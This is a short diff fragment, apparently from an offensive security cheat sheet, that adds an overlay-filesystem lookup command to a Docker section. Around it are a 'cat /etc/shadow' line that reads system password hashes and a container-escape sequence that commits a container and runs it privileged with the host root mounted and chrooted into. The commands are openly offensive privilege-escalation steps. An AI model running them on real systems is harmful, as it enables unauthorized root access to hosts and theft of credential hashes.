@@ -861,6 +861,8 @@ cat /etc/shadow
 
 [*] Containers
 +---------- Docker ----------+
+cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
+
 docker ps -a
 docker commit 35c090009763 tempimg
 docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
